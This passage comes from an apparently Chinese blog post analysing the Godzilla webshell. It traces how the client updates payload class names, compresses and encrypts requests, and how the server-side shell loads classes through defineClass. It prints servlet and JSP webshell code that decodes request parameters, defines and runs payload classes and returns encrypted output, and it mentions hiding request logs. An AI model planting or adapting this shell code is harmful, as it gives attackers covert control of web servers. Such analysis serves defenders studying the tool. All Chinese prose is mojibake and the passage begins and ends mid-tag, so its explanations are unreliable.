src="/2022/05/17/godzilla/2.png"><br>æŠŠburpçš„æ•°æ®åŒ…å¤åˆ¶ä¹‹åï¼Œæœ¬åœ°è§£å¯†çœ‹çœ‹æ˜¯ä»€ä¹ˆå†…å®¹ï¼š<br><img src="/2022/05/17/godzilla/3.png"><br>å¯ä»¥ä»å›¾é‡Œçœ‹å‡ºæ¥å¤§æ¦‚æ˜¯ä¸ªClassæ–‡ä»¶ï¼Œä¿å­˜åˆ°æœ¬åœ°ä¹‹åï¼Œåç¼–è¯‘å¯ä»¥ä¹‹åä¼šå‘ç°è¿™ä¸ªä»£ç å’Œ<code>payload.java</code>é™¤äº†ç±»åä¸åŒï¼ŒåŠŸèƒ½ä»£ç ä¸Šå®Œå…¨ä¸€æ ·ã€‚å“¥æ–¯æ‹‰å®ç°çš„è¿™éƒ¨åˆ†ä»£ç åœ¨<code>JavaShell.class</code>é‡Œé¢ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token class-name">String</span> <span class="token function">randomName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">final</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classNames <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>dynamicClassNameSet<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> className <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>classNames<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">final</span> <span class="token keyword">int</span> index <span class="token operator">=</span> functions<span class="token punctuation">.</span><span class="token function">randomInt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> classNames<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            className <span class="token operator">=</span> classNames<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>dynamicClassNameSet<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> className<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">dynamicUpdateClassName</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> protoName<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classContent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">final</span> <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>classContent<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token class-name">String</span> className <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">randomName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctClass<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>dynamicClassNameHashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>protoName<span class="token punctuation">,</span> className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Log</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"%s ----->>>>> %s"</span><span class="token punctuation">,</span> protoName<span class="token punctuation">,</span> className<span class="token punctuation">)</span><span class="token punctuation">;</span>        classContent <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctClass<span class="token punctuation">.</span><span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> classContent<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Log</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>dynamicClassNameHashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>protoName<span class="token punctuation">,</span> protoName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> classContent<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸»è¦åŠŸèƒ½æ˜¯åŠ¨æ€æ”¹å˜<code>payload.class</code>çš„ç±»åï¼Œä¼šä»<code>classNames.txt</code>é‡Œé¢éšæœºé€‰å–ä¸€ä¸ªåå­—ï¼š<br><img src="/2022/05/17/godzilla/4.png"><br>è¿™æ˜¯ç¬¬ä¸€ä¸ªè¯·æ±‚çš„å‘é€æµç¨‹ï¼Œåšäº†ä¸¤ä»¶äº‹ï¼š</p><ol><li>æŠŠå“¥æ–¯æ‹‰é‡Œé¢çš„<code>payload.class</code>æ›´æ–°ä¸ºéšæœºçš„ç±»åï¼Œç„¶åAESåŠ å¯†å†ç»è¿‡base64å‘é€åˆ°æœåŠ¡ç«¯çš„shell</li><li>æœåŠ¡ç«¯çš„shellè§£ç è§£å¯†ä¹‹åï¼Œè°ƒç”¨<code>defineClass</code>åŠ è½½åˆ°JVMï¼Œåˆå§‹åŒ–payloadå˜é‡</li></ol><p><img src="/2022/05/17/godzilla/5.png"></p><p>å…³äº<code>defineClass</code>çš„ç”¨æ³•ï¼Œå¯ä»¥çœ‹å®˜æ–¹çš„ä»£ç æ³¨é‡Šï¼Œè´Ÿè´£æŠŠbyte[]è½¬æ¢ä¸ºClassï¼š</p><blockquote><p>However, some classes may not originate from a file; they may originate from other sources, such as the network, or they could be constructed by an application. The method {@link #defineClass(String, byte&gt;[], int, int) defineClass} converts an array of bytes into an instance of class Class. Instances of this newly defined class can be created using {@link Class#newInstance Class.newInstance}.</p></blockquote><h3 id="ç¬¬äºŒæ¬¡è¯·æ±‚"><a href="#ç¬¬äºŒæ¬¡è¯·æ±‚" class="headerlink" title="ç¬¬äºŒæ¬¡è¯·æ±‚"></a>ç¬¬äºŒæ¬¡è¯·æ±‚</h3><p>ç¬¬äºŒæ¬¡è¯·æ±‚ï¼ŒæŒ‰ç…§åŒæ ·çš„æ–¹å¼è§£å¯†æ•°æ®åŒ…ï¼Œä¼šå‘ç°å‡ºæ¥çš„æ˜¯ä¸€å †ä¹±ç ï¼š<br><img src="/2022/05/17/godzilla/6.png"><br>ä¸è¦æ…Œï¼Œå…ˆä¿å­˜åˆ°æœ¬åœ°ï¼Œç„¶åé‡å‘½åä¸ºgzæ–‡ä»¶ï¼Œå†ä½¿ç”¨gunzipè§£å‹ä¹‹åæŸ¥çœ‹æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹æ˜¯<code>methodNametest</code><br>åœ¨å“¥æ–¯æ‹‰æºä»£ç é‡Œé¢ï¼Œå¯ä»¥æ‰£å‡ºæ¥ç›¸å…³å®ç°:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">final</span> <span class="token class-name">ReqParameter</span> parameter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReqParameter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> result <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">evalFunc</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">,</span> parameter<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> <span class="token class-name">String</span> codeString <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>codeString<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"ok"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>isAlive <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">Log</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>codeString<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">fillParameter</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> className<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">String</span> funcName<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">ReqParameter</span> parameter<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>className <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> className<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        parameter<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"evalClassName"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClassName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    parameter<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"methodName"</span><span class="token punctuation">,</span> funcName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">evalFunc</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> className<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">String</span> funcName<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">ReqParameter</span> parameter<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">fillParameter</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> funcName<span class="token punctuation">,</span> parameter<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ç»„è£…å‚æ•°methodNametest</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> parameter<span class="token punctuation">.</span><span class="token function">formatEx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> functions<span class="token punctuation">.</span><span class="token function">gzipE</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//gzipå‹ç¼©åŠ å¯†</span>    <span class="token keyword">return</span> functions<span class="token punctuation">.</span><span class="token function">gzipD</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>http<span class="token punctuation">.</span><span class="token function">sendHttpResponse</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å‘é€è¯·æ±‚ä¹‹åæ¥æ”¶æ•°æ®ï¼Œç„¶åè§£å¯†è§£å‹ç¼©</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å“¥æ–¯æ‹‰å®¢æˆ·ç«¯çš„æµç¨‹ï¼šå…ˆåœ¨æœ¬åœ°ç»„è£…æœ¬æ¬¡è¯·æ±‚çš„å‚æ•°ï¼Œå‹ç¼©ä¹‹ååŠ å¯†å‘é€åˆ°æœåŠ¡ç«¯ã€‚</p><p>æ­¤æ—¶åœ¨æ‰“ä¸ªæ–­ç‚¹åšä¸€æ¬¡è°ƒè¯•çœ‹çœ‹ï¼š<br><img src="/2022/05/17/godzilla/8.png"></p><h4 id="f-equals-arrOut"><a href="#f-equals-arrOut" class="headerlink" title="f.equals(arrOut)"></a><code>f.equals(arrOut)</code></h4><p>ç¬¬ä¸€æ¬¡è¿›å…¥åˆ°payloadçš„equalså‡½æ•°ï¼ŒarrOutæ˜¯<code>ByteArrayOutputStream</code>å˜é‡ï¼Œä¼ é€’ç»™<code>this.outputStream</code>ï¼Œåˆå§‹åŒ–ä¸€ä¸ªè¾“å‡ºå¯¹è±¡ï¼Œç”¨äºè·å–payloadæ‰§è¡Œç»“æœï¼Œæœ€ç»ˆè¿”å›ç»™å®¢æˆ·ç«¯ã€‚<br><img src="/2022/05/17/godzilla/10.png"></p><h4 id="f-equals-data"><a href="#f-equals-data" class="headerlink" title="f.equals(data)"></a><code>f.equals(data)</code></h4><p>dataæ˜¯å“¥æ–¯æ‹‰å®¢æˆ·ç«¯ä¼ é€’ç»™æœåŠ¡ç«¯çš„æ•°æ®ï¼ŒæœåŠ¡ç«¯å…ˆè¿›è¡Œè§£å¯†ï¼Œç„¶åè¿›å…¥<code>f.equals(data)</code>å‡½æ•°ï¼Œç„¶åè¿›å…¥<code>handle()</code>å‡½æ•°è¿›è¡Œå˜é‡åˆå§‹åŒ–æ“ä½œï¼š<br><img src="/2022/05/17/godzilla/11.png"><br>ä¸Šè¿°æ“ä½œå®Œæˆä¹‹åï¼Œè¿›å…¥<code>this.formatParameter()</code>å‡½æ•°ï¼Œå¯¹ä¸Šä¸€æ­¥è·å–åˆ°çš„<code>this.requestData</code>è§£å‹ç¼©ä¹‹åå¾ªç¯åˆ¤æ–­å“¥æ–¯æ‹‰ä¼ é€’è¿‡æ¥çš„æ•°æ®ï¼Œæœ€åæ”¾åˆ°<code>this.paramterMap</code>:<br><img src="/2022/05/17/godzilla/12.png"></p><p>ç¬¬äºŒæ¬¡çš„<code>equals</code>å®Œæˆäº†å¯¹å“¥æ–¯æ‹‰ä¼ é€’è¿‡æ¥æ•°æ®çš„åˆå§‹åŒ–ï¼Œæœ€ç»ˆæ”¾åˆ°<code>this.paramterMap</code>ä¿å­˜ã€‚</p><h4 id="f-equals-req"><a href="#f-equals-req" class="headerlink" title="f.equals(req)"></a><code>f.equals(req)</code></h4><p><img src="/2022/05/17/godzilla/9.png"><br>ç¬¬ä¸‰æ¬¡equalsçš„æ—¶å€™æ‰§è¡Œ<code>f.equals(req)</code>ï¼Œè¿›å…¥åˆ°<code>handle()</code>å‡½æ•°ï¼Œå¡«å……<code>this.servletRequest</code>å¯¹è±¡ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">supportClass</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"%s.servlet.http.HttpServletRequest"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>servletRequest <span class="token operator">=</span> obj<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">supportClass</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"%s.servlet.ServletRequest"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>servletRequest <span class="token operator">=</span> obj<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åè¿›å…¥<code>this.handlePayloadContext()</code>åˆ©ç”¨<code>payload.class</code>é‡Œé¢å®šä¹‰å¥½çš„åå°„å‡½æ•°ï¼Œè·å–<code>servletRequest</code>, <code>servletContext</code>, <code>httpSession</code>å¯¹è±¡ï¼Œç„¶åå¡«å……ç»™payloadå˜é‡ï¼š<br><code>this.servletRequest</code>ã€<code>this.servletContext</code>ã€<code>this.httpSession</code>ã€‚</p><p>ç»§ç»­è·Ÿè¿›åˆ¤æ–­<code>this.servletRequest</code>ä¸ä¸ºç©ºçš„æ—¶å€™ï¼Œå°è¯•è·å–<code>servletRequest</code>é‡Œé¢çš„<code>parameters</code>å¯¹è±¡ï¼Œç»è¿‡åˆ¤æ–­ä¹‹åèµ‹ç»™<code>this.requestData</code>ã€‚<br><img src="/2022/05/17/godzilla/13.png"></p><p>è¿™é‡Œä¹‹æ‰€ä»¥åˆå¡«å……ä¸€æ¬¡<code>this.requestData</code>å˜é‡ï¼Œæ˜¯ä¸ºäº†å…¼å®¹æ€§è€ƒè™‘ï¼Œæ¯”å¦‚åœ¨Springé‡Œé¢ç›´æ¥å†™servletï¼Œç»è¿‡ç¬¬äºŒæ¬¡çš„<code>equals()</code>å°±å¡«å……äº†<code>this.requestData</code>å¯¹è±¡ï¼Œä½†æ˜¯åœ¨JSPé‡Œé¢ï¼Œæ˜¯åˆ©ç”¨<br><code>request.setAttribute(&quot;parameters&quot;, data);</code>æ¥èµ°åˆ°ä¸Šé¢è¿™ä¸€æ­¥å¡«å……<code>this.requestData</code>å¯¹è±¡ï¼Œè¿™ä¹Ÿæ˜¯å“¥æ–¯æ‹‰å¯¹servletæ²¡æœ‰ä¾èµ–çš„ä¸»è¦åŸå› ã€‚</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">  <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>pass<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            data <span class="token operator">=</span> <span class="token function">x</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>payload <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                payload <span class="token operator">=</span> <span class="token function">defClass</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span> arrOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//                Object f = payload.newInstance();</span>                <span class="token class-name">Object</span> f <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"basic.payload"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨JSPé‡Œé¢è§£æ<code>pageContext</code>å¯¹è±¡:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>pass<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        data <span class="token operator">=</span> <span class="token function">x</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>session<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            session<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">X</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Q</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            request<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"parameters"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span> arrOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> f <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">;</span>            f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            f<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token function">base64Encode</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ç€ä¼šèµ°åˆ°<code>nolog</code>é‡Œé¢ï¼Œåˆ©ç”¨åå°„éšè—è¯·æ±‚çš„æ—¥å¿—ã€‚è¿™é‡Œåº”è¯¥æ˜¯åªéšè—åœ¨tomcatä¸‹çš„æ—¥å¿—ï¼Œæœªæµ‹è¯•ã€‚</p><h4 id="f-toString"><a href="#f-toString" class="headerlink" title="f.toString()"></a><code>f.toString()</code></h4><p>ä»<code>this.paramterMap</code>é‡Œé¢è·å–è¦æ‰§è¡Œçš„æ¨¡å—å‚æ•°ç­‰å˜é‡ï¼Œç„¶åè¿›å…¥<code>this.run()</code>æ‰§è¡Œ<code>payload.class</code>å®šä¹‰å¥½çš„shellåŠŸèƒ½ï¼š<br><img 